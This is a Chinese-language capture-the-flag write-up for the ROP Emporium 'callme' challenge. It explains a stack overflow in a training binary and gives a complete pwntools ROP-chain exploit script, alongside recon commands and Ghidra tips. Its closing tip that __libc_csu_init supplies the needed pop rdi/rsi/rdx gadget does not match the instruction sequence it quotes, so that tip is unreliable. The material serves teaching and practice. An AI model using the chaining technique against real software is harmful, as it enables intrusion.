# callme

> ROP Emporium 第 3 题 | x86-64 Linux | 知识点: 链式函数调用 + 三件套 pop + .so 动态库

## 题目简介

32 字节栈溢出。需要**按顺序调用** `callme_one`、`callme_two`、`callme_three` 三个函数,**每个函数的 3 个参数都必须**:

```
arg1 = 0xdeadbeefdeadbeef
arg2 = 0xcafebabecafebabe
arg3 = 0xd00df00dd00df00d
```

三个函数都在 `libcallme.so` 里,主程序通过 PLT 调用。

## 核心知识点

- **三件套 pop gadget**: `pop rdi; pop rsi; pop rdx; ret` —— 一次喂 3 个参数寄存器
- **链式函数调用**: 一个 ROP 链里串多个函数调用,函数 ret 后栈上的下一个地址是下一个 gadget
- **参数不保留**: x64 调用约定下被调函数可以随便覆盖参数寄存器,所以每次调用前都要重新喂三魔数
- **动态库链接**: 函数定义在 `.so` 里,PLT 入口在主程序。运行时 ASLR 关 → `.so` 加载基址固定(ROP Emporium 实验环境)
- **`LD_LIBRARY_PATH`**: Linux 加载共享库的搜索路径,题目要求设 `LD_LIBRARY_PATH=.` 让程序找到当前目录的 `libcallme.so`

## 二进制侦察

```bash
file ./callme
ldd ./callme
# libcallme.so => ./libcallme.so (...)

checksec --file=callme
# NX, 无 PIE, 无 canary
```

PLT 符号:

```bash
python3 -c "from pwn import *; print(ELF('./callme').plt.keys())"
# dict_keys([..., 'callme_one', 'callme_two', 'callme_three'])
```

## 攻击思路

### ROP 链总览

```
1. pwnme ret  → ret_gadget (对齐补偿)
2.            → pop_rdi/rsi/rdx; ret
3.            → 弹出三魔数进 RDI/RSI/RDX
4.            → callme_one@plt 执行
5. callme_one 返回 → 重复 (重置参数 + 调 callme_two)
6. callme_two 返回 → 重复 (重置参数 + 调 callme_three)
7. callme_three 返回 → 程序自然退出
```

### 为什么每次都要重喂参数

callme_one 内部会用 RDI / RSI / RDX 做计算,函数返回时这些寄存器的值是垃圾。要调 callme_two 必须重新设 RDI=m1, RSI=m2, RDX=m3。

## exploit

完整代码见 [exploit.py](./exploit.py)。

```python
from pwn import *

elf = context.binary = ELF('./callme')
io = process('./callme', env={'LD_LIBRARY_PATH': '.'})

rop = ROP(elf)
pop3       = rop.find_gadget(['pop rdi', 'pop rsi', 'pop rdx', 'ret']).address
ret_gadget = rop.find_gadget(['ret']).address

m1 = 0xdeadbeefdeadbeef
m2 = 0xcafebabecafebabe
m3 = 0xd00df00dd00df00d

payload  = b'A' * 40
payload += p64(ret_gadget)

for func in (elf.plt['callme_one'], elf.plt['callme_two'], elf.plt['callme_three']):
    payload += p64(pop3)
    payload += p64(m1)
    payload += p64(m2)
    payload += p64(m3)
    payload += p64(func)

io.sendline(payload)
io.interactive()
```

## 关键细节

- **不设 LD_LIBRARY_PATH 会闪退**: 程序找不到 `libcallme.so`,加载失败。`pwntools process(env={'LD_LIBRARY_PATH': '.'})` 直接在子进程里设环境变量
- **Ghidra 负数常量**: Ghidra 反编译时 `0xdeadbeefdeadbeef` 会显示成有符号负数(因为最高位是 1)。右键 → **Convert → Unsigned Hex** 显示成正常 hex
- **三件套 gadget 找不到怎么办?**: 在题目里能找到是因为 `__libc_csu_init` 函数末尾天然有这种 gadget chain(`pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret`)。如果没找到,看 `__libc_csu_init` 反编译

## Flag

```
ROPE{a_placeholder_32byte_flag!}
```

## 参考

- ROP Emporium: <https://ropemporium.com/challenge/callme.html>
